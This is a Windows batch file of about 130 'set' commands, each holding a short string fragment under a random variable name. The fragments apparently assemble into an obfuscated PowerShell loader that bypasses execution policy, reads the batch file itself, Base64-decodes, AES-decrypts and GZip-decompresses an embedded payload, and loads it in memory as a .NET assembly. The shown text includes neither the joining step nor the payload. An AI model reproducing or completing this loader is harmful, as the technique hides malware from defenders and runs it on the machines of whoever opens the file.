@echo off
set "lzIbMRJXXP=L4Yi"
set "dqdolZaRyl=ct S"
set "slQFUDBhVo=).Sp"
set "bQObtCudVk=Secu"
set "uVYWndlwrf=);$y"
set "kFDHCINIzi=bC ="
set "MKoQAycVEY== $q"
set "hLBzPDayUc=gOlh"
set "InxNUqganL= '')"
set "QmkfhcLQfC=ay()"
set "GeJPDXsrUF=);$q"
set "ZriBvljQMA=yste"
set "XFXCrGsuAt=New-"
set "jZnjYXmFBl=$Fku"
set "QAxyLczGjB=hy.A"
set "SEzhmqLNwy=join"
set "lCeXHfVcHN=vert"
set "fjzCRnAmXI=IXN."
set "KcxarrKzxW=[Sys"
set "TMcfpyoitP=Comp"
set "RGnnooxsur=cMGp"
set "SXAYBuDVRx=th('"
set "XGEmJEVCLH=raph"
set "CehfmaHJQy=Stre"
set "hSTHZVTGXN=Comp"
set "QkZkbhldBy=esMa"
set "JHyLuJtReF=Disp"
set "dLeKMlIHOS=mory"
set "kuWJfUanwu=eMVs"
set "gZLXqYEJJY=oin "
set "LNldQxgRpO=and "
set "GYTSvLDQGw=1..-"
set "AnqoEMxQUo=.Cop"
set "BLCggtitOW=Conv"
set "ThSHbgInYr=6esa"
set "JyrgUmPmFP=File"
set "qNYVHaUKlw=d = "
set "iUrpVuYyqO=pres"
set "qwBAZNWOGZ=gMod"
set "xuqjGjJYvg=.Com"
set "EYbIbOmEFS=$JYo"
set "kufSMyjTdf=zHhH"
set "JXMNdqRGYp=JcMG"
set "wKKkuvBJNw=m.Re"
set "xcmtnmGYpe=yste"
set "DBYSKLiPQV=tem."
set "LEazeSjqBw=daeR"
set "YXDuHpeeCc==');"
set "hMtgthTTLG=gOlh"
set "BcQhptYqMT=ss -"
set "DuUUlibGkH=ne);"
set "QOWZhlxyck=ct S"
set "LrfzJKwyHM=yTo("
set "VABZVKzErp=rans"
set "bSvfgwInbv=urit"
set "xnSUapaNdu=N.Su"
set "AUjnoQsBbR=.Mem"
set "kaGEJMwXaU=IXN "
set "tnLMjboFrC=ose("
set "BrhHTSYxeU=[IO."
set "wwgCbkdlyf=JJll"
set "zkDdNiWpBW=-ep "
set "lTgOlgZbAX=p = "
set "deFQdhUUoT=nage"
set "gMXNDlMOmD=ispo"
set "teUgiYCbmd=::De"
set "jjECbWjErc=gnir"
set "gJAYSOZcEd=pher"
set "aZHbmzbIin=y.Cr"
set "awIeHwPKXH=-nop"
set "ESXIQwQgBo=qgOl"
set "MuyZlsvWOu=..-1"
set "yCGOHXFCEV= = ["
set "gCKyZAacgf=YbCS"
set "KiRicmlfaY=nirt"
set "mwoBIvYSfq=, $J"
set "hxefpSkaaG=eam("
set "olDUgsVrfU=g = "
set "IazbEHiKUv=tryP"
set "XtMMJpxoZp=S46e"
set "oTinVrHAbf=.Ass"
set "VZzxTDABbv=3); "
set "WakjejLlsB=::('"
set "RDBHLkkTMR=yQvd"
set "rcXyzmGtTB=();$"
set "HABEqmLSUE=ress"
set "lrbfaomplr=L = "
set "DdxIKLzNGG= if "
set "heRTpLUGuE=.Mod"
set "IDUYbDoDZH=Gp);"
set "QObYkOqYiv=.Con"
set "xmCgiReKkc=('%~f0'"
set "rIpPxWxjFB=d;$q"
set "NVmyvTOOvJ=();$"
set "CwaVKqzDqD=ateD"
set "PRnDOKgJCs=zuZI"
set "dvBacAHNPm=embl"
set "TIOVYBPOMb=$JcM"
set "RjFPfwXLBX=ion."
set "XMlTHefuTr=Star"
set "yKiUghxwqm= = $"
set "ecQyxFpNbq=O.Me"
set "FrzkVlGQlK=]::N"
set "uEWnQhrCYO=Syst"
set "PLCZbnKEHB=h.Pa"
set "WoEycZuNNk=em.I"
set "YTZTjPAVLt=gpDk"
set "DIYDGhLvrY=null"
set "GuuUQbotDp=comp"
set "XEsNeJbXdO='[-1"
set "aAdVXiBdqG=gOlh"
set "AmZmgpuFGj=tS46"
set "RitPJFzuNF='txe"
set "ntsVKYEIxQ=n ''"
set "xQGyEsSpVc=F'[-"
set "bvixqgvKDX=.Cry"
set "ACGwHPHUEu=ode]"
set "AyFeGAuKsv=[Sys"
set "LAEqmgFJrA=Dd);"
set "vfmPGLYNMJ=ose("
set "yPgmzgvcqd=; };"
set "bhIwbRSiyy=.Sec"
set "TvxICGHevi='gni"
set "VUUsnwMzFm=YxVw"
set "dIrhSQabzG=C) {"
set "hhFZujGMin=[Env"
set "gvQnRDZeCW=New-"
set "GaTCJGHqLm=y.Ci"
set "VeAAhABscW=esaB"
set "aNtRbGAMVQ=;$Fk"
set "FXFmZtBRCq=n ''"
set "hDcDdiHmxx=Iswb"
set "rxxxAlSpPA=ddin"
set "ObaIckcClO=t Sy"
set "mVvEzJXpTE=dj0C"
set "WimvjJTrfF=gth)"
set "DnliiNPUdH=TllA"
